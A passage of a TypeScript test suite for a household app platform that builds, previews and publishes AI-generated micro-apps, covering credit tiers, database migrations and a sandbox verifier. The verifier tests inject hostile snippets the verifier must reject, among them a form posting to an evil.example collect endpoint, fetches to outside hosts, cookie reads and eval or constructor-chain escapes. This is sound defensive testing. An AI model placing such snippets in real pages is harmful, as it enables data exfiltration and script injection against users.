/**
 * Milestone 7 behavioural suite: the 3-tier goal ledger, GoalExecutionWF (classify_and_debit, plan_dag, execute_with_self_repair, stage_r2_preview,
 * publish_r3_live), the sandbox verifier, the hosted micro-app runtime, the install packager, and the feature-flagged Gmail consent flow.
 * Real local D1, R2 and KV; only the network (models, Google) and the Workflows engine are faked.
 */

import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { createRequire } from 'node:module';
import { randomUUID } from 'node:crypto';
import { cpSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { creditBalances } from '../src/billing/credits';
import { writeFact } from '../src/graph/writeFact';
import { createGuardedFetch } from '../src/net/egress';
import { handleApi } from '../src/workers/api';
import { issueSessionToken } from '../src/workers/session';
import type { Env } from '../src/types';
import { openTestRuntime, type TestRuntime } from './helpers';
import { makeHousehold } from './helpers/m2';
import { newNetwork, fixtures } from './helpers/m4';
import { APP_ORIGIN } from './helpers/m5';
import { BASE, RESEARCH_PROMPT, SLUG, WIFE_PROMPT, approve, goalRig, insertGoal, runToEnd, type GoalRig } from './helpers/m7';

let rt: TestRuntime;
let fx: ReturnType<typeof fixtures>;
before(async () => {
  rt = await openTestRuntime();
  fx = fixtures(rt);
});
after(async () => {
  await rt.dispose();
});

type Household = Awaited<ReturnType<typeof makeHousehold>>;
const count = async (sql: string, ...b: unknown[]): Promise<number> => (await fx.one<{ n: number }>(`SELECT COUNT(*) AS n FROM (${sql})`, ...b)).n;
const bearer = (env: Env, h: Household): Promise<string> => issueSessionToken(env.SESSION_SECRET, { household_id: h.household_id, member_id: `mem_${h.household_id}` }, 3600, new Date());

async function api(env: Env, path: string, h: Household, o: { body?: unknown; fetch?: typeof fetch; method?: string; raw?: string } = {}): Promise<Response> {
  const method = o.method ?? (o.body !== undefined || o.raw !== undefined ? 'POST' : 'GET');
  return handleApi(
    new Request(`${APP_ORIGIN}${path}`, {
      method,
      headers: { 'content-type': 'application/json', authorization: `Bearer ${await bearer(env, h)}` },
      ...(o.body !== undefined ? { body: JSON.stringify(o.body) } : o.raw !== undefined ? { body: o.raw } : {}),
    }),
    env,
    { fetch: o.fetch ?? createGuardedFetch({ db: rt.db, fetchImpl: newNetwork().fetch, ttlMs: 0 }) },
  );
}
const asJson = async (res: Response): Promise<Record<string, any>> => (await res.json()) as Record<string, any>;

async function seedPrefs(h: Household): Promise<void> {
  const text = 'We love Thai food. Jo is gluten-free.';
  const ep = await fx.userEpisode(h, text);
  const q = (s: string) => ({ quote: s, char_start: text.indexOf(s), char_end: text.indexOf(s) + s.length });
  const a = await writeFact(rt.db, { household_id: h.household_id, source_episode_id: ep, subject: { type: 'household', name: 'The household' }, predicate: 'prefers_cuisine', object: { type: 'cuisine', name: 'Thai' }, confidence: 1, quotes: [q('love Thai food')] });
  const b = await writeFact(rt.db, { household_id: h.household_id, source_episode_id: ep, subject: { type: 'person', name: 'Jo' }, predicate: 'dietary_restriction', value_text: 'gluten-free', confidence: 1, quotes: [q('gluten-free')] });
  assert.ok(a.status === 'written' && b.status === 'written', JSON.stringify([a, b]));
}

/** Creates a goal through the API (so the route, the price and the redaction are all exercised) and points the rig at the instance it started. */
async function createViaApi(rig: GoalRig, h: Household, prompt: string): Promise<Record<string, any>> {
  const res = await api(rig.env, '/api/goals', h, { body: { prompt_text: prompt } });
  assert.equal(res.status, 202);
  const body = await asJson(res);
  Object.assign(rig.params, rig.workflows.goal.at(-1)!.params);
  return body;
}

const goalRow = (id: string) => fx.one<Record<string, any>>('SELECT * FROM goals WHERE goal_id = ?', id);
const tasks = (id: string) => fx.all<{ seq_no: number; kind: string; status: string; retries: number; error_text: string | null }>('SELECT seq_no, kind, status, retries, error_text FROM goal_tasks WHERE goal_id = ? ORDER BY seq_no', id);
const spent = async (id: string): Promise<number> => (await fx.one<{ c: number }>('SELECT COALESCE(SUM(cost_usd), 0) AS c FROM llm_usage WHERE run_id = ?', id)).c;
const appPath = (h: Household, rest = ''): string => `/apps/${h.household_id}/${SLUG}${rest}`;

// ═══════════════ the benchmark: a wife's recipe app, end to end ═══════════════

test('BENCHMARK: "build my wife a recipe app" runs the five stages, costs 5 credits under $1.25, previews before it publishes, and serves a working app', async () => {
  const h = await makeHousehold(rt.db);
  await fx.grant(h, 5);
  await seedPrefs(h);
  const rig = goalRig(rt, h);
  const created = await createViaApi(rig, h, WIFE_PROMPT);
  assert.deepEqual([created.tier, created.credits, created.max_cost_usd], ['micro_app', 5, 1.25]);
  assert.equal(rig.params.base_url, APP_ORIGIN, 'the app links are built from the origin the member used');

  const during: Record<string, unknown> = {};
  const { outcome, steps, waits } = await runToEnd(
    rig,
    async () => {
      const row = await goalRow(rig.params.goal_id);
      during['status'] = row['status'];
      const preview = await api(rig.env, appPath(h, '/preview'), h, { fetch: rig.deps.fetch });
      during['preview'] = preview.status;
      during['previewHtml'] = await preview.text();
      during['prod'] = (await api(rig.env, appPath(h), h, { fetch: rig.deps.fetch })).status;
      during['wrongHash'] = (await api(rig.env, `/api/goals/${rig.params.goal_id}/approve`, h, { body: { approval_hash: 'x'.repeat(64) } })).status;
      during['approve'] = (await api(rig.env, `/api/goals/${rig.params.goal_id}/approve`, h, { body: { approval_hash: row['approval_hash'] } })).status;
      during['events'] = rig.workflows.goalEvents.length;
      return rig.workflows.goalEvents.at(-1)!.payload;
    },
    rt,
  );

  assert.deepEqual(steps, ['classify_and_debit', 'plan_dag', 'execute_with_self_repair', 'stage_r2_preview', 'publish_r3_live']);
  assert.deepEqual(waits.map((w) => w.type), [`goal_approval:${rig.params.goal_id}`]);
  assert.equal(during['status'], 'AWAITING_APPROVAL');
  assert.equal(during['preview'], 200, 'the preview works while production is gated');
  assert.match(String(during['previewHtml']), /<base href="\/apps\/hh_/);
  assert.equal(during['prod'], 404, 'production is gated until the member approves');
  assert.equal(during['wrongHash'], 409);
  assert.equal(during['approve'], 202);
  assert.equal(during['events'], 1, 'only the matching hash reached the Workflow');

  assert.equal(outcome.status, 'completed');
  const prod = `${BASE}/apps/${h.household_id}/${SLUG}`;
  assert.deepEqual(outcome, { status: 'completed', prod_url: prod });
  const goal = await goalRow(rig.params.goal_id);
  assert.deepEqual([goal['status'], goal['credits_reserved'], goal['max_cost_usd'], goal['prod_url'], goal['error_code']], ['COMPLETED', 5, 1.25, prod, null]);
  assert.ok(goal['cost_usd'] > 0 && goal['cost_usd'] < 1.25, `cost ${goal['cost_usd']}`);
  assert.equal(goal['cost_usd'], await spent(rig.params.goal_id), 'goals.cost_usd is the sum of llm_usage');

  // 6-step DAG, all passed, in order
  assert.deepEqual((await tasks(rig.params.goal_id)).map((t) => [t.seq_no, t.kind, t.status, t.retries]), [
    [0, 'decompose', 'PASSED', 0], [1, 'context_gather', 'PASSED', 0], [2, 'schema_gen', 'PASSED', 0], [3, 'code_gen', 'PASSED', 0], [4, 'verify_bundle', 'PASSED', 0], [5, 'smoke_test', 'PASSED', 0], [6, 'package_install', 'PASSED', 0],
  ]);

  // the ledger: exactly 5 credits, keyed by the goal
  assert.deepEqual(await creditBalances(rt.db, h.household_id), { subscription: 0, purchased: 0, total: 0 });
  assert.deepEqual(await fx.all('SELECT entry_id, delta, reason, run_id FROM credit_ledger WHERE household_id = ? AND run_id IS NOT NULL', h.household_id), [{ entry_id: `led_debit_${rig.params.goal_id}`, delta: -5, reason: 'mission_debit', run_id: rig.params.goal_id }]);

  // the app: LIVE, bundle encrypted in R2 under apps/<hh>/<app_id>/
  const app = await fx.one<Record<string, any>>('SELECT * FROM micro_apps WHERE goal_id = ?', rig.params.goal_id);
  assert.deepEqual([app['status'], app['slug'], app['monthly_ai_calls_cap']], ['LIVE', SLUG, 100]);
  assert.ok((app['bundle_r2_key'] as string).startsWith(`apps/${h.household_id}/${app['app_id']}/`));
  const stored = await rt.bucket.get(app['bundle_r2_key']);
  assert.ok(stored !== null);
  assert.ok(!(await stored.text()).includes('<!doctype'), 'ciphertext, not the page');

  // the grounded fact
  const fact = await fx.one<Record<string, any>>(`SELECT f.value_text, e.redacted_text FROM facts_current f JOIN episodes e ON e.episode_id = f.source_episode_id WHERE f.household_id = ? AND f.predicate = 'hosted_micro_app'`, h.household_id);
  assert.equal(fact['value_text'], prod);
  const quote = await fx.one<{ quote: string; char_start: number; char_end: number }>(`SELECT q.quote, q.char_start, q.char_end FROM fact_quotes q JOIN facts f ON f.fact_id = q.fact_id WHERE f.household_id = ? AND f.predicate = 'hosted_micro_app'`, h.household_id);
  assert.equal(quote.quote, `Published: Jo Recipe Book at ${prod}`);
  assert.equal((fact['redacted_text'] as string).slice(quote.char_start, quote.char_end), quote.quote, 'verbatim in the episode');

  // the install artifact
  const detail = await asJson(await api(rig.env, `/api/goals/${rig.params.goal_id}`, h));
  assert.equal(detail['status'], 'COMPLETED');
  const art = detail['install_artifact'];
  assert.deepEqual(Object.keys(art).sort(), ['app_url', 'cloudflare_pages_patch', 'embed_snippet', 'github_pr_bundle', 'version']);
  assert.match(art.embed_snippet.iframe, /^<iframe src="https:\/\/app\.example\/apps\/hh_[^"]+\?t=/);
  assert.equal(art.cloudflare_pages_patch.subdomain, 'recipes.jos-kitchen.example');

  // ── the live app works ──
  const call = (path: string, init: { body?: unknown; h?: Household } = {}) => api(rig.env, appPath(h, path), init.h ?? h, { ...(init.body === undefined ? {} : { body: init.body }), fetch: rig.deps.fetch });
  assert.equal((await call('')).status, 200, 'production now serves');
  const parsed = await call('/api/parse-recipe', { body: { text: 'Pad Thai\nIngredients: rice noodles, shrimp, tamarind paste, peanuts\n1. Soak the noodles.' } });
  assert.equal(parsed.status, 200);
  const bread = await call('/api/parse-recipe', { body: { text: 'Garlic Bread\nIngredients: wheat flour bread, butter, garlic\n1. Toast.' } });
  assert.equal(bread.status, 200);
  const found = await asJson(await call('/api/search?q=noodles'));
  assert.deepEqual(found['records'].map((r: any) => r.title), ['Pad Thai']);
  const sug = await asJson(await call('/api/suggest'));
  assert.deepEqual(sug['used_facts'], { cuisines: ['Thai'], restrictions: ['gluten-free'] });
  assert.ok(sug['suggestions'].length >= 1);
  assert.ok(!JSON.stringify(sug['suggestions']).includes('Garlic Bread') || JSON.stringify(sug['suggestions']).includes('gluten'), 'the gluten dish is excluded or flagged');
});

// ═══════════════ migration 0005 ═══════════════

test('MIGRATION 0005: applies over a populated Milestone 1-6 database, keeps every row byte for byte with 0 foreign-key violations, and adds only what it says', async () => {
  const root = process.env['PROJECT_ROOT'] ?? process.cwd();
  const tmp = mkdtempSync(join(tmpdir(), 'm7-migration-'));
  const migrations = join(tmp, 'migrations');
  const state = join(tmp, 'state');
  const open = async () => {
    const req = createRequire(resolve(root, 'package.json'));
    const { getPlatformProxy } = req('wrangler') as { getPlatformProxy: (o: unknown) => Promise<{ env: { DB: D1Database }; dispose(): Promise<void> }> };
    return getPlatformProxy({ configPath: join(tmp, 'wrangler.toml'), persist: { path: join(state, 'v3') } });
  };
  const apply = (): string => {
    const r = spawnSync('npx', ['wrangler', 'd1', 'migrations', 'apply', 'DB', '--local', '-c', join(tmp, 'wrangler.toml'), '--persist-to', state], {
      cwd: root, encoding: 'utf8', env: { ...process.env, CI: '1', WRANGLER_SEND_METRICS: 'false' },
    });
    assert.equal(r.status, 0, `${r.stdout}\n${r.stderr}`);
    return r.stdout;
  };
  const dump = async (db: D1Database, tables: string[]): Promise<Record<string, string>> =>
    Object.fromEntries(await Promise.all(tables.map(async (t) => [t, JSON.stringify((await db.prepare(`SELECT * FROM ${t} ORDER BY 1, 2`).all()).results)])));
  const TABLES = ['households', 'members', 'connectors', 'episodes', 'mission_runs', 'steps', 'credit_ledger', 'credit_balance', 'price_watches', 'life_receipts', 'inbox_connections', 'ingested_messages', 'predicate_registry', 'mission_templates', 'triggers', 'policy_blocklist'];
  try {
    mkdirSync(migrations);
    for (const f of readdirSync(join(root, 'migrations')).filter((n) => n < '0005')) cpSync(join(root, 'migrations', f), join(migrations, f));
    writeFileSync(join(tmp, 'wrangler.toml'), readFileSync(join(root, 'test/wrangler.test.toml'), 'utf8').replace('migrations_dir = "../migrations"', 'migrations_dir = "migrations"'));
    apply();

    let proxy = await open();
    let db = proxy.env.DB;
    const h = await makeHousehold(db);
    const ep = `ep_${randomUUID().slice(0, 12)}`;
    await db.batch([
      db.prepare(`INSERT INTO connectors (connector_id, household_id, kind, status, scopes, token_kv_key) VALUES ('c1', ?, 'gmail', 'active', 'gmail', 'gmail:c1')`).bind(h.household_id),
      db.prepare(`INSERT INTO episodes (episode_id, household_id, source, redacted_text, sha256, redaction_status) VALUES (?, ?, 'email', 'Annual fee is $895', ?, 'clean')`).bind(ep, h.household_id, randomUUID()),
      db.prepare(`INSERT INTO mission_runs (run_id, household_id, template_key, template_version, origin, params_json, state, credit_cost) VALUES ('run_old', ?, 'return_deadline', 1, 'trigger', '{"dedupe_key":"k"}', 'R2_AWAITING', 1)`).bind(h.household_id),
      db.prepare(`INSERT INTO steps (run_id, step_no, kind, tier, status) VALUES ('run_old', 1, 'read', 'R0', 'ok')`),
      db.prepare(`INSERT INTO credit_ledger (entry_id, household_id, delta, sub_delta, pur_delta, reason, stripe_event_id) VALUES ('led_t', ?, 5, 5, 0, 'trial_grant', ?)`).bind(h.household_id, `trial:${h.household_id}`),
      db.prepare(`INSERT INTO credit_ledger (entry_id, household_id, delta, sub_delta, pur_delta, reason, run_id) VALUES ('led_d', ?, -1, -1, 0, 'mission_debit', 'run_old')`).bind(h.household_id),
      db.prepare(`INSERT INTO inbox_connections (household_id) VALUES (?)`).bind(h.household_id),
      db.prepare(`INSERT INTO ingested_messages (household_id, message_id_norm, source, triage_bucket) VALUES (?, 'k1', 'gmail', 'RECEIPT_ORDER')`).bind(h.household_id),
      db.prepare(`INSERT INTO price_watches (watch_id, household_id, kind, params_json, ceiling_cents) VALUES ('pw1', ?, 'flight', '{}', 50000)`).bind(h.household_id),
      db.prepare(`INSERT INTO life_receipts (receipt_id, household_id, week_start, payload_json) VALUES ('rc1', ?, '2026-11-23', '{}')`).bind(h.household_id),
    ]);
    const before = await dump(db, TABLES);
    const predicatesBefore = (await db.prepare('SELECT COUNT(*) AS n FROM predicate_registry').first<{ n: number }>())!.n;
    const dietBefore = await db.prepare(`SELECT * FROM predicate_registry WHERE predicate = 'dietary_restriction'`).first();
    await proxy.dispose();

    cpSync(join(root, 'migrations', '0005_milestone7.sql'), join(migrations, '0005_milestone7.sql'));
    assert.match(apply(), /0005_milestone7\.sql/);
    proxy = await open();
    db = proxy.env.DB;

    const after = await dump(db, TABLES);
    const changed = TABLES.filter((t) => before[t] !== after[t]);
    assert.deepEqual(changed, ['predicate_registry'], 'only the predicate registry gains a row; every other pre-existing row is untouched');
    assert.equal((await db.prepare('SELECT COUNT(*) AS n FROM predicate_registry').first<{ n: number }>())!.n, predicatesBefore + 1);
    assert.deepEqual(await db.prepare(`SELECT * FROM predicate_registry WHERE predicate = 'dietary_restriction'`).first(), dietBefore, 'dietary_restriction keeps its M1 row (domain people)');
    const hosted = await db.prepare(`SELECT cardinality, value_type, domain FROM predicate_registry WHERE predicate = 'hosted_micro_app'`).first<{ cardinality: string; value_type: string; domain: string }>();
    assert.deepEqual(hosted, { cardinality: 'many', value_type: 'text', domain: 'vault' });
    const domains = (await db.prepare('SELECT DISTINCT domain FROM predicate_registry ORDER BY domain').all<{ domain: string }>()).results.map((r) => r.domain);
    assert.deepEqual(domains, ['budget', 'calendar', 'cards', 'people', 'taste', 'vault'], 'every predicate stays inside the six allowed domains');
    assert.deepEqual((await db.prepare('PRAGMA foreign_key_check').all()).results, [], '0 foreign-key violations');
    for (const t of ['goals', 'goal_tasks', 'micro_apps', 'micro_app_records']) assert.equal((await db.prepare(`SELECT COUNT(*) AS n FROM ${t}`).first<{ n: number }>())!.n, 0, t);

    // the new tables work on the migrated database, including the ledger FK through an anchor row
    const at = new Date().toISOString();
    await db.batch([
      db.prepare(`INSERT INTO mission_runs (run_id, household_id, template_key, template_version, origin, params_json, state, credit_cost, created_at, updated_at) VALUES ('goal_a', ?, 'goal_micro_app', 1, 'user', '{}', 'CANCELED', 5, ?, ?)`).bind(h.household_id, at, at),
      db.prepare(`INSERT INTO goals (goal_id, household_id, prompt_text, tier, status, credits_reserved, max_cost_usd, created_at, updated_at) VALUES ('goal_a', ?, 'p', 'micro_app', 'PLANNING', 5, 1.25, ?, ?)`).bind(h.household_id, at, at),
      db.prepare(`INSERT INTO credit_ledger (entry_id, household_id, delta, sub_delta, pur_delta, reason, run_id) VALUES ('led_debit_goal_a', ?, -5, -5, 0, 'mission_debit', 'goal_a')`).bind(h.household_id),
    ]);
    assert.deepEqual((await db.prepare('PRAGMA foreign_key_check').all()).results, []);
    await proxy.dispose();
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
});

test('MIGRATION 0005: the CHECKs pin tier, credits and cap together; retries stop at 2; tenancy is enforced by the database', async () => {
  const h = await makeHousehold(rt.db);
  const other = await makeHousehold(rt.db);
  const at = new Date().toISOString();
  const goal = (id: string, tier: string, credits: number, cap: number, hh = h.household_id) =>
    rt.db.prepare(`INSERT INTO goals (goal_id, household_id, prompt_text, tier, status, credits_reserved, max_cost_usd, created_at, updated_at) VALUES (?, ?, 'p', ?, 'PLANNING', ?, ?, ?, ?)`).bind(id, hh, tier, credits, cap, at, at).run();
  await goal('goal_ok5', 'micro_app', 5, 1.25);
  await goal('goal_ok3', 'research_plan', 3, 0.75);
  for (const [tier, credits, cap] of [['micro_app', 3, 0.75], ['micro_app', 5, 0.75], ['micro_app', 1, 0.25], ['research_plan', 5, 1.25], ['research_plan', 3, 1.25], ['quick_mission', 1, 0.25], ['micro_app', 5, 1.5]] as const) {
    await assert.rejects(goal(`goal_bad_${randomUUID().slice(0, 6)}`, tier, credits, cap), /constraint/i, `${tier}/${credits}/${cap}`);
  }
  await assert.rejects(rt.db.prepare(`INSERT INTO goals (goal_id, household_id, prompt_text, tier, status, credits_reserved, max_cost_usd, created_at, updated_at) VALUES ('goal_s', ?, 'p', 'micro_app', 'DONE', 5, 1.25, ?, ?)`).bind(h.household_id, at, at).run(), /constraint/i, 'status is a closed set');
  await assert.rejects(rt.db.prepare(`UPDATE goals SET cost_usd = -1 WHERE goal_id = 'goal_ok5'`).run(), /constraint/i);
  await assert.rejects(goal('goal_nohh', 'micro_app', 5, 1.25, 'hh_nobody'), /foreign key|constraint/i);

  const task = (seq: number, kind: string, retries = 0) =>
    rt.db.prepare(`INSERT INTO goal_tasks (task_id, goal_id, seq_no, kind, spec_json, status, retries) VALUES (?, 'goal_ok5', ?, ?, '{}', 'PENDING', ?)`).bind(`t_${seq}_${randomUUID().slice(0, 4)}`, seq, kind, retries).run();
  await task(0, 'decompose');
  await assert.rejects(task(0, 'code_gen'), /UNIQUE|constraint/i, 'one task per (goal, seq_no)');
  await assert.rejects(task(1, 'deploy_to_prod'), /constraint/i, 'task kinds are a closed set');
  await assert.rejects(task(2, 'code_gen', 3), /constraint/i, 'at most 2 repairs');
  await task(3, 'code_gen', 2);

  const app = (id: string, goal_id: string, slug: string, hh: string) =>
    rt.db.prepare(`INSERT INTO micro_apps (app_id, household_id, goal_id, slug, title, bundle_r2_key, manifest_json, status, created_at) VALUES (?, ?, ?, ?, 't', 'k', '{}', 'STAGED', ?)`).bind(id, hh, goal_id, slug, at).run();
  await app('app_1', 'goal_ok5', 'recipes', h.household_id);
  await assert.rejects(app('app_2', 'goal_ok3', 'recipes', h.household_id), /UNIQUE|constraint/i, 'a slug is unique within a household');
  await assert.rejects(app('app_3', 'goal_ok5', 'other', other.household_id), /an app must belong to its goal's household/, 'micro_apps_tenant');
  await assert.rejects(rt.db.prepare(`INSERT INTO micro_apps (app_id, household_id, goal_id, slug, title, bundle_r2_key, manifest_json, status, created_at) VALUES ('app_4', ?, 'goal_ok5', 'x', 't', 'k', '{}', 'LIVE_NOW', ?)`).bind(h.household_id, at).run(), /constraint/i);
  const rec = (hh: string, app_id = 'app_1') =>
    rt.db.prepare(`INSERT INTO micro_app_records (record_id, app_id, household_id, collection, title, search_tokens, data_json, created_at) VALUES (?, ?, ?, 'recipes', 't', ' t ', '{}', ?)`).bind(`rec_${randomUUID().slice(0, 8)}`, app_id, hh, at).run();
  await rec(h.household_id);
  await assert.rejects(rec(other.household_id), /a record must belong to its app's household/, 'micro_app_records_tenant');
  await assert.rejects(rec(h.household_id, 'app_missing'), /a record must belong|foreign key|constraint/i);
});

// ═══════════════ the 3-tier ledger and the documents ═══════════════

test('TIERS: Quick Mission 1 credit / $0.25, research plan 3 / $0.75, micro-app 5 / $1.25; the classifier is deterministic and never prices a goal by model output', async () => {
  const { QUICK_MISSION_CREDITS, GOAL_TIERS, classifyGoal, creditsFor, maxCostFor } = await import('../src/goals/tiers');
  const { maxRunCostUsd } = await import('../src/missions/gates');
  assert.equal(QUICK_MISSION_CREDITS, 1);
  assert.deepEqual(GOAL_TIERS, { research_plan: { credits: 3 }, micro_app: { credits: 5 } });
  assert.deepEqual([creditsFor('research_plan'), creditsFor('micro_app')], [3, 5]);
  assert.deepEqual([maxCostFor('research_plan'), maxCostFor('micro_app')], [0.75, 1.25]);
  assert.equal(maxCostFor('micro_app'), maxRunCostUsd(5));
  assert.equal(maxRunCostUsd(QUICK_MISSION_CREDITS), 0.25);
  const cases: Array<[string, string]> = [
    [WIFE_PROMPT, 'micro_app'],
    ['Build a tracker for the kids chores', 'micro_app'],
    ['please create a dashboard for our trips', 'micro_app'],
    ['Make me a planner', 'micro_app'],
    ['Install a recipe page on my website', 'micro_app'],
    [RESEARCH_PROMPT, 'research_plan'],
    ['Compare health insurance plans for next year', 'research_plan'],
    ['Build a case for switching mortgage lenders', 'research_plan'],
    ['I need an app', 'research_plan'],
    ['My app tracker is slow; build a case for switching lenders', 'research_plan'],
    ['', 'research_plan'],
  ];
  for (const [prompt, tier] of cases) assert.equal(classifyGoal(prompt), tier, prompt);
  assert.equal(classifyGoal('x'.repeat(5000) + ' build an app'), 'research_plan', 'only the first 4,000 characters are read');
});

test('CLAUDE.MD: documents GoalExecutionWF, the four tables, the 3-tier ledger and the Gmail flag, and the file is still Claude.md', async () => {
  const root = process.env['PROJECT_ROOT'] ?? process.cwd();
  const files = readdirSync(root);
  assert.ok(files.includes('Claude.md'));
  assert.ok(!files.includes('CLAUDE.md'));
  const doc = readFileSync(join(root, 'Claude.md'), 'utf8');
  for (const needle of ['GoalExecutionWF', 'goals', 'goal_tasks', 'micro_apps', 'micro_app_records', 'ENABLE_GMAIL_OAUTH', 'CASA_PENDING', 'Quick Mission', 'Deep Research', 'Micro-App Builder', 'classify_and_debit', 'publish_r3_live', 'hosted_micro_app', '$1.25', '$0.75']) {
    assert.ok(doc.includes(needle), `Claude.md must mention ${needle}`);
  }
  const { GOAL_TIERS } = await import('../src/goals/tiers');
  assert.match(doc, new RegExp(`Autonomous Micro-App Builder[^\\n]*${GOAL_TIERS.micro_app.credits} credits`));
  assert.match(doc, new RegExp(`Deep Research[^\\n]*${GOAL_TIERS.research_plan.credits} credits`));
});

// ═══════════════ the sandbox verifier ═══════════════

import { APP_TEMPLATES, MAX_HTML_CHARS, formatDiagnostics, verifyBundle, type Bundle } from '../src/builder/sandboxVerifier';
import { buildInstallArtifact, domainFromPrompt, DOMAIN_PLACEHOLDER } from '../src/builder/installPackager';
import { smokeTestBundle } from '../src/builder/smokeTest';
import { signAppToken, verifyAppToken } from '../src/builder/microAppRuntime';
import { MIN_PLAN_SECTIONS, verifyPlan } from '../src/goals/planVerifier';
import { REF, goalModel } from './helpers/m7';

const HH = 'hh_testhouse';
const BLOCK = ['resy.com', 'opentable.com', 'tock.com', 'sevenrooms.com', 'api.monarch.com'];
const verify = (b: unknown, slug?: string) => verifyBundle(b, { household_id: HH, blocklist: BLOCK, ...(slug === undefined ? {} : { slug }) });
const codes = (b: unknown, slug?: string): string[] => [...new Set(verify(b, slug).diagnostics.map((d) => d.code))].sort();
const html = (f: (h: string) => string) => (slug: string = SLUG, title?: string): Bundle => ({ ...REF(slug, title), html: f(REF(slug, title).html) });
const inject = (snippet: string) => html((h) => h.replace('</body>', `${snippet}</body>`));
const manifest = (f: (m: any) => void) => (slug: string = SLUG, title?: string): Bundle => {
  const b = structuredClone(REF(slug, title));
  f(b.manifest);
  return b;
};

test('VERIFIER: the reference recipe bundle passes with no diagnostics, and every template route has a handler the runtime serves', () => {
  assert.deepEqual(verify(REF(), SLUG).diagnostics, []);
  assert.equal(verify(REF(), SLUG).ok, true);
  assert.deepEqual(Object.keys(APP_TEMPLATES), ['recipe_book']);
  assert.deepEqual(APP_TEMPLATES['recipe_book']!.routes.map((r) => `${r.method} ${r.path} ${r.handler}`), ['GET / ui', 'GET /preview preview', 'POST /api/parse-recipe parse_recipe', 'GET /api/search search', 'GET /api/suggest suggest']);
});

const FORBIDDEN: Array<[string, string, () => Bundle]> = [
  ['eval', 'EVAL', inject('<script>eval("1+1")</script>')],
  ['new Function', 'NEW_FUNCTION', inject('<script>var f = new Function("return 1");</script>')],
  ['Function(', 'FUNCTION_CTOR', inject('<script>var f = Function("return 1");</script>')],
  ['process.env', 'PROCESS_ENV', inject('<script>var k = process.env.SECRET;</script>')],
  ['external script', 'EXTERNAL_SCRIPT', inject('<script src="https://cdn.example/x.js"></script>')],
  ['external image', 'EXTERNAL_LOAD', inject('<img src="https://tracker.example/p.gif" alt="">')],
  ['external stylesheet', 'EXTERNAL_LOAD', html((h) => h.replace('</head>', '<link rel="stylesheet" href="https://fonts.example/a.css"></head>'))],
  ['external form target', 'EXTERNAL_FORM', inject('<form action="https://evil.example/collect"><input aria-label="x"></form>')],
  ['fetch to another origin', 'EXTERNAL_FETCH', inject('<script>fetch("https://evil.example/x")</script>')],
  ['fetch of a computed url', 'FETCH_TARGET', inject('<script>var u = "api/" + 1; fetch(u)</script>')],
  ['fetch outside api/', 'FETCH_TARGET', inject('<script>fetch("/api/auth/me")</script>')],
  ['XMLHttpRequest', 'XHR', inject('<script>new XMLHttpRequest()</script>')],
  ['WebSocket', 'WEBSOCKET', inject('<script>new WebSocket("wss://x.example")</script>')],
  ['sendBeacon', 'BEACON', inject('<script>navigator.sendBeacon("api/search")</script>')],
  ['dynamic import', 'DYNAMIC_IMPORT', inject('<script>import("https://x.example/m.js")</script>')],
  ['document.cookie', 'COOKIE', inject('<script>var c = document.cookie;</script>')],
  ['location navigation', 'NAVIGATION', inject('<script>location.href = "https://x.example";</script>')],
  ['document.write', 'DOCUMENT_WRITE', inject('<script>document.write("x")</script>')],
  ['javascript: url', 'JAVASCRIPT_URL', inject('<a href="javascript:alert(1)">x</a>')],
  ['srcdoc iframe', 'SRCDOC', inject('<iframe srcdoc="<b>x</b>"></iframe>')],
  ['meta refresh', 'META_REFRESH', html((h) => h.replace('</head>', '<meta http-equiv="refresh" content="0;url=https://x.example"></head>'))],
  ['base tag', 'BASE_TAG', html((h) => h.replace('</head>', '<base href="https://x.example/"></head>'))],
  ['resy.com (policy blocklist)', 'BLOCKLISTED_ORIGIN', inject('<a href="https://resy.com/cities/ny">book</a>')],
  ['api.monarch.com (policy blocklist)', 'BLOCKLISTED_ORIGIN', inject('<script>/* api.monarch.com */</script>')],
  ['opentable.com in text', 'BLOCKLISTED_ORIGIN', inject('<p>reserve at opentable.com</p>')],
  ['another household in a URL', 'CROSS_TENANT', inject('<script>fetch("/apps/hh_other/recipe-book/api/search")</script>')],
  ['another household id', 'CROSS_TENANT', inject('<p data-x="hh_somebodyelse"></p>')],
  ['bracket access to a global', 'INDIRECT_GLOBAL', inject('<script>window["fe" + "tch"]("api/search")</script>')],
  ['globalThis by name', 'INDIRECT_GLOBAL', inject('<script>globalThis["eval"]("1")</script>')],
  ['constructor chain', 'CONSTRUCTOR_CHAIN', inject('<script>[].constructor.constructor("return 1")()</script>')],
  ['a timer given a string', 'STRING_TIMER', inject('<script>setTimeout("alert(1)", 10)</script>')],
  ['a worker', 'WORKER', inject('<script>new Worker("w.js")</script>')],
  ['household_id key', 'TENANT_REFERENCE', inject('<script>var q = {household_id: "x"};</script>')],
  ['an app id', 'TENANT_REFERENCE', inject('<p data-app="app_0123456789abcdef"></p>')],
];
for (const [name, code, make] of FORBIDDEN) {
  test(`VERIFIER rejects ${name} (${code})`, () => {
    const found = codes(make(), SLUG);
    assert.ok(found.includes(code), `${code} expected, got ${found.join(', ') || 'nothing'}`);
    assert.equal(verify(make(), SLUG).ok, false);
  });
}

const STRUCTURE: Array<[string, string, () => unknown]> = [
  ['template', 'UNSUPPORTED_TEMPLATE', manifest((m) => (m.template = 'chore_tracker'))],
  ['unknown manifest key', 'UNKNOWN_KEY', manifest((m) => (m.webhook = 'https://x.example'))],
  ['manifest version', 'MANIFEST_VERSION', manifest((m) => (m.version = 2))],
  ['slug shape', 'BAD_SLUG', manifest((m) => (m.slug = 'A_B'))],
  ['slug mismatch', 'SLUG_MISMATCH', manifest((m) => (m.slug = 'another-slug'))],
  ['empty title', 'BAD_TITLE', manifest((m) => (m.title = '  '))],
  ['long title', 'BAD_TITLE', manifest((m) => (m.title = 'x'.repeat(81)))],
  ['missing collection', 'MISSING_COLLECTION', manifest((m) => (m.collections = []))],
  ['unknown collection', 'UNKNOWN_COLLECTION', manifest((m) => m.collections.push('users'))],
  ['missing route', 'MISSING_ROUTE', manifest((m) => m.routes.pop())],
  ['unknown route', 'UNKNOWN_ROUTE', manifest((m) => m.routes.push({ method: 'GET', path: '/admin', handler: 'ui' }))],
  ['duplicate route', 'DUPLICATE_ROUTE', manifest((m) => m.routes.push({ ...m.routes[0] }))],
  ['wrong handler', 'BAD_HANDLER', manifest((m) => (m.routes[0].handler = 'search'))],
